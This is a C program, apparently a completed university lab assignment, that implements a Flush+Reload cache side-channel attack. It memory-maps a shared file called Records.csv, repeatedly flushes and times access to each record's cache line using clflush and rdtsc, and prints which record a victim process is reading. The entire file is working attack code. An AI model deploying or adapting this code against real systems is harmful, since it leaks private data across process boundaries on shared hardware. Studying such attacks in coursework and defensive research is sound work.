#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sched.h>
#include <unistd.h>
#include <x86intrin.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <stdlib.h>

// Return the size of a file
long file_size(const char *filename) {
    struct stat s; 
    if (stat(filename,&s) != 0) {
        printf("Error reading file stats !\n");
        return 1;
    }    
    printf("File size = %lu\n", s.st_size);
    return s.st_size; 
}

/* Performs a dummy access
   to the address specified. */
void maccess(void *addr)
{
    asm volatile ("movq (%0), %%rax\n"
        :
        : "c" (addr)
        : "rax");
}

/* Flushes the cache block corresponding
   to the address from the entire cache
   hierarchy. */
void flush(void *addr)
{
    asm volatile("clflush 0(%0)\n"
        :
        : "c" (addr)
        :"rax");
}

/* Reads the Time Stamp Counter. */
uint64_t rdtsc() {
  uint64_t a, d;
  asm volatile ("mfence");
  asm volatile ("rdtsc" : "=a" (a), "=d" (d));
  a = (d<<32) | a;
  asm volatile ("mfence");
  return a;
}

/* combines rdtsc and maccess */
uint64_t measure_one_block_access_time(void* addr)
{
    uint64_t cycles;

    asm volatile("mov %1, %%r8\n\t"
            "lfence\n\t"
            "rdtsc\n\t"
            "mov %%eax, %%edi\n\t"
            "mov (%%r8), %%r8\n\t"
            "lfence\n\t"
            "rdtsc\n\t"
            "sub %%edi, %%eax\n\t"
    : "=a"(cycles) /*output*/
    : "r"(addr)
    : "r8", "edi");

    return cycles;
}

int main(int argc, char* argv[])
{
    int i, j, k;
    uint64_t time;
    int a[64] = {0};
    unsigned long hit_time, miss_time;

    if (argc != 2) {
        printf("Usage: attack hit_time,miss_time\n");
        return 1;
    }

    hit_time = atoi(strtok(argv[1], ","));
    miss_time = atoi(strtok(NULL, ","));
    if (hit_time < 0 || miss_time < 0) {
        printf("Error: Invalid hit/miss time\n");
        return 1;
    }

	char* filename = "Records.csv";
	int fd = open(filename, O_RDONLY);
    unsigned char *addr = (unsigned char *)mmap(0, file_size(filename), PROT_READ, MAP_SHARED, fd, 0);
    if (addr == (void*) -1 || addr == (void*) 0) {
        printf("error: failed to mmap\n");
        return 1;
    }
    
    /* Insert your code here. Things to keep in mind:
       1. Do not scan the cache sets sequentially.
          Use a function such as (index*prime + offset)%(maxrange).
          This is to overcome prefetching.
       2. Use sched_yield() while waiting for victim to access.
       3. Use hit_time and/or miss_time to detect hits and misses.
       4. Monitor the same cache set N times before monitoring the
          next set. (Clue: N~10 should work)
    */
    
    int csv_offsets[] = {126, 88, 98, 101, 89, 100, 93, 84, 98, 88, 110, 91, 101, 92, 91, 90, 88, 98, 87, 94, 88, 96, 95, 97, 90, 92, 97, 88, 101, 96, 90, 90, 89, 93, 92, 99, 95, 89, 82, 95, 95, 88, 96, 96, 95, 102, 95, 99, 96, 95, 89, 103, 90, 97, 102, 88, 87, 89, 90, 90, 97, 88, 86, 96, 92, 91, 105, 89, 95, 101, 97, 96, 100, 93, 91, 88, 85, 90, 101, 107, 91, 90, 91, 111, 100};

    int prime = 7;//used to randomize the access
    int offset = 0;
    int maxrange = 86;
    int N = 10;
    int index;

    int printed[maxrange];
    for(int j = 0; j < maxrange; j++) printed[j] = 0;

    while(1){
        int arr[maxrange];
        for(int j = 0; j < maxrange; j++) arr[j] = 0;

        for(int i = 0; i < maxrange; i++){
            
            index = (i*prime + 64) % maxrange;
            offset = 0;
            //access the value at index
            for(int j = 0; j < index; j++){
                offset += csv_offsets[j];
            }

            for(int j = 0; j < N; j++){
                flush(addr + offset);
                sched_yield();
                time = measure_one_block_access_time(addr + offset);

                // take note if cache hit
                if(time <= hit_time){
                    arr[index]++;
                }
                flush(addr + offset);
            }
        }

        // print
        int maxIndex = 0;
        int maxVal = 0;
        for(int j = 0; j < maxrange; j++){
            if(arr[j] > maxVal){
                maxIndex = j;
                maxVal = arr[j];
            }
        }
        // if(maxVal > 0){
        if(maxVal > 0 && printed[maxIndex] == 0){
            printf("%d\n", maxIndex);
            printed[maxIndex] = 1;
        } 
        
    }    

    return 0;    
}
